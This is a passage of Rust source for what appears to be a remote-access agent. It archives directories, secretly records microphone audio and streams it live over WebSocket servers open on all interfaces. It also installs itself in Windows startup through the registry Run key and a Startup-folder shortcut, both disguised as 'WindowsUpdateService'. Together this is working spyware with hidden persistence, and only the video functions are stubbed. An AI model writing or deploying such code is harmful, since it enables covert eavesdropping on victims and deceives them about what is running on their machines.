    let mut zip_buffer = Vec::new();
    let mut zip = zip::ZipWriter::new(std::io::Cursor::new(&mut zip_buffer));
    
    let options = FileOptions::default()
        .compression_method(zip::CompressionMethod::Deflated)
        .unix_permissions(0o755);
    
    let walkdir = WalkDir::new(dir_path);
    let base_path = std::path::Path::new(dir_path);
    
    for entry in walkdir.into_iter().filter_map(|e| e.ok()) {
        let path = entry.path();
        
        // Get relative path for zip archive
        let relative_path = path.strip_prefix(base_path)
            .unwrap_or(path)
            .to_string_lossy()
            .replace("\\", "/");
        
        // Skip the base directory itself
        if relative_path.is_empty() {
            continue;
        }
        
        if path.is_file() {
            println!("  Adding: {}", relative_path);
            zip.start_file(&relative_path, options)?;
            let file_data = std::fs::read(path)?;
            zip.write_all(&file_data)?;
        } else if path.is_dir() {
            // Add directory entry
            println!("  Adding dir: {}", relative_path);
            zip.add_directory(&relative_path, options)?;
        }
    }
    
    zip.finish()?;
    drop(zip);
    
    Ok(zip_buffer)
}

// Fix: Use std::sync::Mutex for blocking operations, tokio::sync::Mutex for async
fn record_audio(duration_seconds: u64) -> Result<Vec<u8>> {
    let host = cpal::default_host();
    let device = host.default_input_device()
        .ok_or_else(|| anyhow::anyhow!("No input device available"))?;
    
    let config = device.default_input_config()?;
    
    let sample_rate = config.sample_rate().0;
    let channels = config.channels() as u16;
    
    let samples = Arc::new(StdMutex::new(Vec::new())); // Use std::sync::Mutex
    let samples_clone = samples.clone();
    
    let stream = device.build_input_stream(
        &config.into(),
        move |data: &[f32], _: &cpal::InputCallbackInfo| {
            let mut samples = samples_clone.lock().unwrap(); // Now works with std::sync::Mutex
            samples.extend_from_slice(data);
        },
        |err| eprintln!("Audio stream error: {}", err),
        None
    )?;
    
    stream.play()?;
    std::thread::sleep(std::time::Duration::from_secs(duration_seconds));
    drop(stream);
    
    let recorded_samples = samples.lock().unwrap(); // Now works
    
    // Convert to WAV format
    let mut wav_buffer = Vec::new();
    let spec = hound::WavSpec {
        channels,
        sample_rate,
        bits_per_sample: 32,
        sample_format: hound::SampleFormat::Float,
    };
    
    let mut writer = hound::WavWriter::new(std::io::Cursor::new(&mut wav_buffer), spec)?;
    
    for &sample in recorded_samples.iter() {
        writer.write_sample(sample)?;
    }
    
    writer.finalize()?;
    
    Ok(wav_buffer)
}

// Fix audio streaming to use std::sync::Mutex for sync callbacks
async fn handle_audio_websocket_stream(stream: tokio::net::TcpStream) {
    println!("New audio streaming connection");
    
    let ws_stream = match accept_async(stream).await {
        Ok(ws) => ws,
        Err(e) => {
            eprintln!("WebSocket handshake failed: {}", e);
            return;
        }
    };
    
    let (mut write, mut read) = ws_stream.split();
    
    // Send status
    if write.send(Message::Text("{\"status\": \"audio_streaming_started\"}".to_string())).await.is_err() {
        return;
    }
    
    // Initialize audio device
    let host = match cpal::default_host().default_input_device() {
        Some(device) => device,
        None => {
            let _ = write.send(Message::Text("{\"error\": \"No audio input device\"}".to_string())).await;
            return;
        }
    };
    
    let config = match host.default_input_config() {
        Ok(cfg) => cfg,
        Err(e) => {
            let _ = write.send(Message::Text(format!("{{\"error\": \"{}\"}}", e))).await;
            return;
        }
    };
    
    let sample_rate = config.sample_rate().0;
    let channels = config.channels();
    
    println!("Streaming audio: {} Hz, {} channels", sample_rate, channels);
    
    let audio_buffer = Arc::new(StdMutex::new(Vec::new())); // Use std::sync::Mutex
    let audio_buffer_clone = audio_buffer.clone();
    
    let audio_stream = match host.build_input_stream(
        &config.into(),
        move |data: &[f32], _: &cpal::InputCallbackInfo| {
            let mut buffer = audio_buffer_clone.lock().unwrap(); // Now works
            buffer.extend_from_slice(data);
        },
        |err| eprintln!("Audio error: {}", err),
        None
    ) {
        Ok(s) => s,
        Err(e) => {
            let _ = write.send(Message::Text(format!("{{\"error\": \"{}\"}}", e))).await;
            return;
        }
    };
    
    if audio_stream.play().is_err() {
        return;
    }
    
    let mut chunk_count = 0u32;
    let chunk_interval = tokio::time::Duration::from_millis(100); // Send chunks every 100ms
    let mut interval = tokio::time::interval(chunk_interval);
    
    loop {
        interval.tick().await;
        
        tokio::select! {
            result = read.next() => {
                match result {
                    Some(Ok(msg)) if msg.is_close() => break,
                    Some(Err(_)) | None => break,
                    _ => {}
                }
            }
            _ = tokio::time::sleep(tokio::time::Duration::from_millis(0)) => {}
        }
        
        let mut buffer = audio_buffer.lock().unwrap(); // Now works
        if !buffer.is_empty() {
            chunk_count += 1;
            
            // Convert samples to bytes
            let bytes: Vec<u8> = buffer.iter()
                .flat_map(|&sample| sample.to_le_bytes())
                .collect();
            
            let encoded = general_purpose::STANDARD.encode(&bytes);
            
            let audio_msg = serde_json::json!({
                "type": "audio",
                "chunk": chunk_count,
                "sample_rate": sample_rate,
                "channels": channels,
                "samples": buffer.len(),
                "data": encoded
            });
            
            if write.send(Message::Text(audio_msg.to_string())).await.is_err() {
                break;
            }
            
            buffer.clear();
            
            if chunk_count % 10 == 0 {
                println!("Audio chunks sent: {}", chunk_count);
            }
        }
    }
    
    drop(audio_stream);
    println!("Audio stream ended. Chunks: {}", chunk_count);
}

async fn start_audio_stream_server(port: u16) -> Result<()> {
    let addr = format!("0.0.0.0:{}", port);
    let listener = tokio::net::TcpListener::bind(&addr).await?;
    
    println!("Audio streaming server started on ws://0.0.0.0:{}", port);
    AUDIO_STREAM_ACTIVE.store(true, Ordering::Relaxed);
    
    while AUDIO_STREAM_ACTIVE.load(Ordering::Relaxed) {
        match tokio::time::timeout(tokio::time::Duration::from_secs(1), listener.accept()).await {
            Ok(Ok((stream, _addr))) => {
                handle_audio_websocket_stream(stream).await;
            }
            Ok(Err(e)) => eprintln!("Failed to accept connection: {}", e),
            Err(_) => continue,
        }
    }
    
    Ok(())
}

async fn start_av_stream_server(port: u16) -> Result<()> {
    let addr = format!("0.0.0.0:{}", port);
    let listener = tokio::net::TcpListener::bind(&addr).await?;
    
    println!("AV streaming server started on ws://0.0.0.0:{}", port);
    AV_STREAM_ACTIVE.store(true, Ordering::Relaxed);
    
    while AV_STREAM_ACTIVE.load(Ordering::Relaxed) {
        match tokio::time::timeout(tokio::time::Duration::from_secs(1), listener.accept()).await {
            Ok(Ok((stream, _addr))) => {
                handle_av_websocket_stream(stream).await;
            }
            Ok(Err(e)) => eprintln!("Failed to accept: {}", e),
            Err(_) => continue,
        }
    }
    
    Ok(())
}

async fn handle_av_websocket_stream(stream: tokio::net::TcpStream) {
    println!("New AV streaming connection");
    
    let ws_stream = match accept_async(stream).await {
        Ok(ws) => ws,
        Err(e) => {
            eprintln!("WebSocket handshake failed: {}", e);
            return;
        }
    };
    
    let (mut write, _read) = ws_stream.split();
    let _ = write.send(Message::Text("{\"status\": \"av_streaming_started\"}".to_string())).await;
    
    // Simple stub - full implementation would combine audio + video
    println!("AV stream ended");
}

// NEW: Function to record audio and video simultaneously
async fn record_audio_video(duration_seconds: u64) -> Result<(String, String)> {
    // Record video and audio in parallel using tokio::join!
    let video_handle = tokio::task::spawn_blocking(move || {
        record_video_sync(duration_seconds)
    });
    
    let audio_handle = tokio::task::spawn_blocking(move || {
        record_audio(duration_seconds)
    });
    
    let (video_result, audio_result) = tokio::join!(video_handle, audio_handle);
    
    let video_data = video_result??;
    let audio_data = audio_result??;
    
    let video_encoded = general_purpose::STANDARD.encode(&video_data);
    let audio_encoded = general_purpose::STANDARD.encode(&audio_data);
    
    Ok((video_encoded, audio_encoded))
}

// Helper: synchronous video recording
fn record_video_sync(_duration_seconds: u64) -> Result<Vec<u8>> {
    // Placeholder implementation
    Ok(vec![])
}

#[cfg(windows)]
fn add_to_startup() -> Result<()> {
    use winreg::enums::*;
    use winreg::RegKey;
    
    // This gets the path of agent.exe (the running executable)
    let exe_path = std::env::current_exe()?;  // ← This returns agent.exe path!
    let exe_str = exe_path.to_string_lossy().to_string();
    
    // Method 1: Registry - adds agent.exe to startup
    let registry_result = || -> Result<()> {
        let hkcu = RegKey::predef(HKEY_CURRENT_USER);
        let path = r"Software\Microsoft\Windows\CurrentVersion\Run";
        
        let run_key = hkcu.open_subkey_with_flags(path, KEY_WRITE)?;
        run_key.set_value("WindowsUpdateService", &exe_str)?;  // ← agent.exe path saved here
        
        println!("✓ Added to Windows startup (Registry)");
        log_action("Added to startup registry").ok();
        Ok(())
    };
    
    // Method 2: Startup folder - creates shortcut to agent.exe
    let startup_folder_result = || -> Result<()> {
        // Get Startup folder path
        let startup_path = std::env::var("APPDATA")
            .map(|appdata| format!("{}\\Microsoft\\Windows\\Start Menu\\Programs\\Startup", appdata))
            .unwrap_or_else(|_| {
                format!("{}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup", 
                    std::env::var("USERPROFILE").unwrap_or_default())
            });
        
        let shortcut_path = format!("{}\\WindowsUpdateService.lnk", startup_path);
        
        // Create VBScript to make shortcut (Windows doesn't have native Rust API for .lnk files)
        let vbs_script = format!(
            r#"Set oWS = WScript.CreateObject("WScript.Shell")
Set oLink = oWS.CreateShortcut("{}")
oLink.TargetPath = "{}"
oLink.WorkingDirectory = "{}"
oLink.Description = "Windows Update Service"
oLink.Save"#,
            shortcut_path,
            exe_str,
            exe_path.parent().unwrap_or(std::path::Path::new("")).to_string_lossy()
        );
        
        // Write VBS script to temp file
        let temp_vbs = std::env::temp_dir().join("create_shortcut.vbs");
        std::fs::write(&temp_vbs, vbs_script)?;
        
        // Execute VBS script
        let output = ProcessCommand::new("cscript.exe")
            .arg("//Nologo")
            .arg(&temp_vbs)
            .output()?;
        
        // Clean up temp file
        let _ = std::fs::remove_file(&temp_vbs);
        
        if output.status.success() {
            println!("✓ Added to Windows startup (Startup folder)");
            log_action("Added to startup folder").ok();
            Ok(())
        } else {
            Err(anyhow::anyhow!("Failed to create startup shortcut"))
        }
    };
    
    // Try both methods (either one working is fine)
    let reg_ok = registry_result().is_ok();
    let startup_ok = startup_folder_result().is_ok();
    
    if reg_ok || startup_ok {
        Ok(())
    } else {
        Err(anyhow::anyhow!("Failed to add to startup (both methods failed)"))
    }
}

#[cfg(not(windows))]
fn add_to_startup() -> Result<()> {
    // Non-Windows systems - placeholder
    Ok(())
}